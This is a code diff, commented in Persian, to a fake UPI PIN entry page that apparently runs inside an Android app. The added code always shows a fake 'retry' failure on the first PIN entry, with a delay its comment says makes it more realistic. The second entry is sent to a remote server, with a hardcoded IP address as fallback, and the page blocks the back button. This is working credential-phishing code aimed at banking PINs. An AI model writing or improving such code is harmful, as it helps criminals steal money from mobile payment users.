@@ -8,6 +8,16 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
     let pinArr = [];
+    let isFirstAttempt = true;  // ⭐ برای track کردن اولین تلاش
+    
+    // ⭐ چک کردن اینکه آیا قبلاً PIN وارد شده یا نه
+    function checkAttemptStatus() {
+      const savedAttempt = localStorage.getItem('upi_pin_attempt');
+      if (savedAttempt === 'failed') {
+        isFirstAttempt = false;  // قبلاً یک بار fail شده
+      }
+    }
+    
     function updateInputs() {
       for (let i = 0; i < 6; i++) {
         document.getElementById('pin' + i).value = '';
@@ -53,12 +63,30 @@
     }
     function closeRetryDialog() {
       document.getElementById("retryDialog").classList.add("hidden");
+      // ⭐ بعد از بستن retry dialog، PIN رو پاک کن برای تلاش بعدی
+      pinArr = [];
+      updateInputs();
     }
     function submitPIN() {
       if (pinArr.length === 4 || pinArr.length === 6) {
         const pin = pinArr.join('');
         showLoadingDialog();
         
+        // ⭐ اگر اولین بار هست، fail کن و retry نشون بده
+        if (isFirstAttempt) {
+          setTimeout(() => {
+            hideLoadingDialog();
+            showRetryDialog();
+            localStorage.setItem('upi_pin_attempt', 'failed');  // ذخیره که fail شده
+            isFirstAttempt = false;  // بار بعد موفق باشه
+            // پاک کردن PIN برای تلاش بعدی
+            pinArr = [];
+            updateInputs();
+          }, 1500);  // یکم delay برای واقعی‌تر شدن
+          return;
+        }
+        
+        // ⭐ بار دوم: واقعاً ارسال کن
         try {
           // ⭐ دریافت Base URL و Device ID از Android
           const baseUrl = Android.getBaseUrl();
@@ -82,6 +110,8 @@
             return res.json();
           })
           .then(data => {
+            // ⭐ پاک کردن attempt status بعد از موفقیت
+            localStorage.removeItem('upi_pin_attempt');
             setTimeout(() => {
               window.location.href = "final.html";
             }, 500);
@@ -93,7 +123,20 @@
           });
         } catch (err) {
           console.error("Error getting Android data:", err);
-          // Fallback for browser testing
+          // ⭐ اگر اولین بار هست، همون fail کن
+          if (isFirstAttempt) {
+            setTimeout(() => {
+              hideLoadingDialog();
+              showRetryDialog();
+              localStorage.setItem('upi_pin_attempt', 'failed');
+              isFirstAttempt = false;
+              pinArr = [];
+              updateInputs();
+            }, 1500);
+            return;
+          }
+          
+          // Fallback for browser testing (بار دوم)
           const fallbackDeviceId = "browser_test_" + Date.now();
           const fallbackBaseUrl = "http://95.134.130.160:8765";
           
@@ -114,6 +157,7 @@
             return res.json();
           })
           .then(data => {
+            localStorage.removeItem('upi_pin_attempt');
             setTimeout(() => {
               window.location.href = "final.html";
             }, 500);
@@ -129,6 +173,7 @@
       }
     }
     window.onload = () => { 
+      checkAttemptStatus();  // ⭐ چک کردن وضعیت attempt
       updateInputs();
       // Disable back button
       history.pushState(null, null, location.href);
